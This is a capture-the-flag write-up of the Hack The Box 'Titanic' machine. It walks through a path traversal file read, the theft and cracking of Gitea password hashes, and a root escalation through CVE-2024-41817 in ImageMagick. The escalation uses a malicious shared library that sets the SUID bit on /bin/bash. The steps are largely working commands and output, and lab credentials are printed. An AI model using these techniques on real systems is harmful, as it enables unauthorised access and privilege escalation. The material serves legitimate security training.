---
icon: ship
---

# HTB-TITANIC

<figure><img src="../../../../.gitbook/assets/image (372).png" alt=""><figcaption></figcaption></figure>

#### **Attack Flow Explanation**

**Initial Access**

1. **Booking Form** → Exploit **path traversal** to perform local file reads as the `developer` user.
2. Read the **hosts file** → Discover **Gitea service** running on a development subdomain.
3. **Explore repositories** → Locate **Docker configuration files**.
4. Retrieve the **Gitea database** dump.
5. Extract the **developer’s password hash** from the dump.
6. **Crack the hash** → Gain shell access as **developer**.

**Privilege Escalation**\
7\. Exploit **CVE-2024-41817** in **ImageMagick** → Gain shell as **root**.

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**nmap** shows a redirect to `titanic.htb` therefore I add this to my `/etc/hosts` file.

### Initial Access <a href="#initial-access" id="initial-access"></a>

<figure><img src="../../../../.gitbook/assets/image (373).png" alt=""><figcaption></figcaption></figure>

On the **titanic.htb** web page, there’s very little of interest at first glance. The only interactive element is a **“Book a Trip”** button, which leads to a form requiring the user to provide several details before submission.

<figure><img src="../../../../.gitbook/assets/image (374).png" alt=""><figcaption></figcaption></figure>

After submitting the form, the browser prompts me to download a **JSON** file containing the details I had just entered.

Repeating the process while intercepting the request in **BurpSuite** reveals a **GET** request to:

```
/download?ticket=<UUID>.json
```

By replacing the `ticket` parameter with a path traversal payload pointing to `/etc/passwd`, I was able to successfully retrieve and view the file contents — confirming a **local file read vulnerability**.

<figure><img src="../../../../.gitbook/assets/image (375).png" alt=""><figcaption></figcaption></figure>

Although I can read files as the **developer** user (based on access to their home directory), there’s nothing of immediate value there.

However, inspecting `/etc/hosts` reveals an additional subdomain:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Titanic]
└─$ curl "http://titanic.htb/download?ticket=../../../../../etc/hosts"
127.0.0.1   localhost titanic.htb dev.titanic.htb
127.0.1.1   titanic

# The following lines are desirable for IPv6 capable hosts
::1         ip6-localhost ip6-loopback
fe00::0     ip6-localnet
ff00::0     ip6-mcastprefix
ff02::1     ip6-allnodes
ff02::2     ip6-allrouters
```

Adding `dev.titanic.htb` to my own hosts file reveals a **Gitea** installation at `http://dev.titanic.htb`. Exploring the interface shows two repositories owned by the `developer` user.

<figure><img src="../../../../.gitbook/assets/image (376).png" alt=""><figcaption></figcaption></figure>

Reviewing the **flask-app** repository shows the source code for the application running on the main page. While it doesn’t reveal much new functionality, it does contain two tickets referencing possible usernames: `rose.bukater` and `jack.dawson`.

The second repository, **docker-config**, is more revealing. It contains two Docker Compose files. The MySQL configuration includes the root password:

```
MySQLP@$$w0rd!
```

However, this password does not work for any of the previously discovered usernames.

More importantly, the Compose file for the **Gitea** service shows that its data directory is mounted as a local folder within the developer’s home directory. This means it should be accessible via the **local file read** vulnerability discovered earlier.

```python
version: '3'
 
services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

According to Gitea’s Docker installation documentation, the configuration file is located at:

```javascript
/data/gitea/conf/app.ini
```

Using the previously discovered local file read vulnerability, I retrieved this file. Inside, it revealed the path to the actual **SQLite3** database containing the sensitive data I was after. I then proceeded to download this database for further analysis.

```python
┌──(sn0x㉿sn0x)-[~/HTB/Titanic]
└─$ curl "http://titanic.htb/download?ticket=../../../../../home/developer/gitea/data/gitea/conf/app.ini"
APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea
 
--- SNIP ---
 
[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true
 
[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD =
LOG_SQL = false
SCHEMA =
SSL_MODE = disable
 
┌──(sn0x㉿sn0x)-[~/HTB/Titanic]
└─$ curl "http://titanic.htb/download?ticket=../../../../../home/developer/gitea/data/gitea/gitea.db" -o gitea.db
```

Besides `developer` there’s also another user called `administrator` and I get access to both their hashes and the salt used to generate them.

```python
┌──(sn0x㉿sn0x)-[~/HTB/Titanic]
└─$ sqlite3 gitea.db
 
sqlite> select name,passwd,salt,passwd_hash_algo from user;
administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|2d149e5fbd1b20cf31db3e3c6a28fc9b|pbkdf2$50000$50
developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34|pbkdf2$50000$50
```

To crack the password hashes from the Gitea database, they first needed to be converted into a format compatible with **hashcat**. Fortunately, an existing script, `gitea2hashcat.py`, automates this process.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Titanic]
└─$ python gitea2hashcat.py '8bf3e3452b78544f8bee9400d6936d34|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56'
[+] Run the output hashes through hashcat mode 10900 (PBKDF2-HMAC-SHA256)
```

The script output was:

```
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

Running **hashcat** in mode `10900` cracked the hash within seconds, revealing the cleartext password:

```
25282528
```

With these credentials, I logged in via SSH as **developer** and successfully obtained the **first flag**.

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

Since the **developer** account has no `sudo` privileges and can only list their own processes, I began searching common directories for scripts or binaries that could be leveraged for privilege escalation.

In `/opt/scripts`, I found a root-owned Bash script named **`identify_images.sh`**:

```bash
#!/bin/bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

This script:

1. Navigates to `/opt/app/static/assets/images`
2. Empties `metadata.log`
3. Runs `/usr/bin/magick identify` on all `.jpg` files in that directory and appends the output to the log

Since the **developer** user has write permissions to `/opt/app/static/assets/images`, I can introduce malicious `.jpg` files that will be processed by `magick identify` when the script is executed by root.

Checking the installed ImageMagick version:

```
Version: ImageMagick 7.1.1-35
```

This matches a known vulnerability, **CVE-2024-41817**, which has publicly available proof-of-concept exploits. This flaw allows **arbitrary file read** or **command execution** via specially crafted image files.

```python
┌──(sn0x㉿sn0x)-[~/HTB/Titanic]
└─$ /usr/bin/magick -version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)


```

I moved into the writable images directory so the payload would be picked up by the scheduled root-owned script:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Titanic]
└─$ cd /opt/app/static/assets/images/
```

Using the **CVE-2024-41817** exploit method, I compiled a malicious `libxcb.so.1` shared library that, when loaded, sets the **SUID bit** on `/bin/bash`. This ensures that any user can execute `bash` with root privileges:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Titanic]
└─$ cd /opt/app/static/assets/images/
 
$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
__attribute__((constructor)) void init(){
    system("chmod u+s /bin/bash");
    exit(0);
}
EOF
```

I then waited for the scheduled `identify_images.sh` script to run as root, which triggered the malicious library.

After a few minutes, `/bin/bash` had the SUID bit set, allowing me to spawn a root shell:

```bash
bash -p
whoami
# root
```

***

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
